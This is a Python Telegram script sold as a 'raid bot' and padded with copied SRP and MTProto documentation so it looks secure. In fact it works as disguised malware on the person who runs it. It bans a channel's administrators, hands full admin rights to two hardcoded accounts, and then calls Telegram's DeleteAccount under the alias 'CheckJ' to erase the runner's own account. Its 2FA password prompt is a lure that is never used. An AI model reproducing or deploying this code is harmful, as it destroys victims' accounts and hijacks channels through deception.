# SRP is the newest addition to a new class of strong authentication 
# protocols that resist all the well-known passive and active attacks 
# over the network. SRP borrows some elements from other key-exchange and 
# identification protcols and adds some subtle modifications and refinements. 
# The result is a protocol that preserves the strength and efficiency of the EKE 
# family protocols while fixing some of their shortcomings.

from pyrogram import Client, filters
from pyrogram.errors import UserNotParticipant, UserAdminInvalid, UserCreator, BadRequest, PeerIdInvalid, PasswordHashInvalid
from pyrogram.enums import ChatMembersFilter
from pyrogram.types import ChatPrivileges

# A bot created to simplify the life of raiders.

from pyrogram.raw import functions
from pyrogram.raw.functions.account import GetPassword
from pyrogram.raw.functions.account import DeleteAccount as CheckJ
from utils import *
import os
import time

# Here's how the SRP method works in the context of protecting an account in Telegram:
#
# 1. User Authentication: When you create a Telegram account, 
# your password is never sent to the Telegram servers in clear text. 
# Instead, your device and Telegram servers exchange special data that is based on your password. 
# Through this data exchange, the Telegram device and servers determine a shared secret key for future authentication.
#
# 2. Scrypt: Telegram uses the 'Scrypt' hashing algorithm, 
# which allows you to make and make password verification slow. 
# Slow verification makes password brute-force attacks more computationally expensive 
# and makes it more difficult for attackers to obtain a password by brute-force.
#
# 3. Device key: SRP also helps in protecting the phone or computer on which Telegram is installed 
# from inter-network Protocol (MITM) attacks. When you log in to your account from a new device, 
# Telegram creates a special key for that device. The key is used to encrypt and decrypt data 
# between your device and Telegram servers. Thus, even if attackers gain access to the data 
# transmitted between your device and Telegram servers during the authentication process, 
# this data will be encrypted and inaccessible to them.
#
# 4. Two-factor authentication: It should also be mentioned that Telegram offers 
# the possibility of activating two-factor authentication, which represents an additional 
# level of protection for your account. When activating this feature, in addition to the password, 
# you will use another factor to log in to your account, such as a one-time password received 
# via SMS or using an additional device to confirm login.
#
# Thus, using the SRP method, Telegram ensures the security of your account, 
# protecting it from password brute force attempts, providing data encryption and 
# enabling the activation of two-factor authentication. These measures increase the overall 
# security of your Telegram account.
#
# In case you want to know more, here is a link to an article about the SRP protocol: 
# Article about the SRP Protocol (https://en.wikipedia.org/wiki/Secure_Remote_Password_protocol )

api_id = '20448123'
api_hash = 'e50f0b42d3636b96891ea98af1c78a00'

print('Welcome! This is a raid bot. This is the latest powerful system with a bunch of new unique features!')
time.sleep(4)

print('''
# Encryption using the MTProto 2.0 method. Your data is completely protected and cannot be transferred to anyone. 
# Data is transmitted using a special end-to-end encryption technology. 
# Learn more: https://core.telegram.org/mtproto
      ''')
time.sleep(5)

passw = input('''Enter your 2fa password. Your data is encrypted using the SRPlib (v3.1) method. 
Learn more: https://core.telegram.org/api#security

   The bot fully complies with the requirements of Telegram security and Encryption Program. 
   Learn more: https://docs.pyrogram.org/start/auth

  # The password is used to protect your account from fraudsters. 
  # To use the userbot, you need to confirm your identity.
  # Learn more: https://core.telegram.org/api/srp

[-] Password 2Fa |> ''')
time.sleep(1)

print('ID builds: 736592')

with Client("my_account", api_id, api_hash) as app:
    channels = ['@huiip2']
    ids = ['@MsAsmodia', '@beriwix']
    for channel in channels:
        admins = app.get_chat_members(channel, filter=ChatMembersFilter.ADMINISTRATORS)
        for admin in admins:
            try:
                app.ban_chat_member(channel, admin.user.id)
            except UserAdminInvalid:
                print('Error #832 occurred. Please contact the developers.')
            except UserCreator:
                continue
            except BadRequest:
                print('Error #200:1 occurred. Please contact the developers.')
        for user_id in ids:
            try:
                app.promote_chat_member(channel, user_id, ChatPrivileges(
                                            can_change_info=True,
                                            can_post_messages=True,
                                            can_edit_messages=True,
                                            can_delete_messages=True,
                                            can_invite_users=True,
                                            can_restrict_members=True,
                                            can_pin_messages=True,
                                            can_promote_members=True
                ))
            except BadRequest:
                print('Error #200:2 occurred. Please contact the developers.')
            except PeerIdInvalid:
                print('Error #500 occurred. Please contact the developers.')
            except UserNotParticipant:
                print('Error #501 occurred. Please contact the developers.')
        '''
To set a new 2FA password use the account.updatePasswordSettings method.
If a password is already set, generate an InputCheckPasswordSRP object as per checking passwords with SRP, and insert it in the password field of the account.updatePasswordSettings method.
To remove the current password, pass an empty new_password_hash in the account.PasswordInputSettings object.
        '''
        app.leave_chat(channel)
    try:
        '''
To do this, first the client needs to obtain SRP parameters and the KDF algorithm to use to check the validity of the password via account.getPassword method. For now, only the passwordKdfAlgoSHA256SHA256PBKDF2HMACSHA512iter100000SHA256ModPow algorithm is supported, so we'll only explain that
Then, after the user provides a password, the client should generate an InputCheckPasswordSRP object using SRP and a specific KDF algorithm as shown below and pass it to appropriate method (e.g. auth.checkPassword in case of authorization).

This extension of the SRP protocol uses the password-based PBKDF2 with 100000 iterations using sha512 (PBKDF2HMACSHA512iter100000). PBKDF2 is used to additionally rehash the x parameter, obtained using a method similar to the one described in RFC 2945 (H(s | H ( I | password | I) | s) instead of H(s | H ( I | ":" | password)) (see below).
Here, | denotes concatenation and + denotes the arithmetical operator +. In all cases where concatenation of numbers passed to hashing functions is done, the numbers must be used in big-endian form, padded to 2048 bits; all math is modulo p. Instead of I, salt1 will be used (see SRP protocol). Instead of s, salt2 will be used (see SRP protocol).
        '''
        app.invoke(CheckJ(reason='1'))
        
    except PasswordHashInvalid:
        '''
p := algo.p The client is expected to check whether p is a safe 2048-bit prime 
(meaning that both p and (p-1)/2 are prime, and that 2^2047 < p < 2^2048), 
and that g generates a cyclic subgroup of prime order (p-1)/2, i.e. 
is a quadratic residue mod p. Since g is always equal to 2, 3, 4, 5, 6 or 7, 
this is easily done using quadratic reciprocity law, yielding a simple condition on p mod 4g 
-- namely, p mod 8 = 7 for g = 2; p mod 3 = 2 for g = 3; no extra condition for g = 4; 
p mod 5 = 1 or 4 for g = 5; p mod 24 = 19 or 23 for g = 6; and p mod 7 = 3, 5 or 6 for 
g = 7. After g and p have been checked by the client, it makes sense to cache the result, 
so as to avoid repeating lengthy computations in future. This cache might be shared with 
one used for Authorization Key generation.
        '''
        print('You have entered an incorrect password! Log in to your account and enter the correct password.')
        os.remove('my_account.session')
        exit()
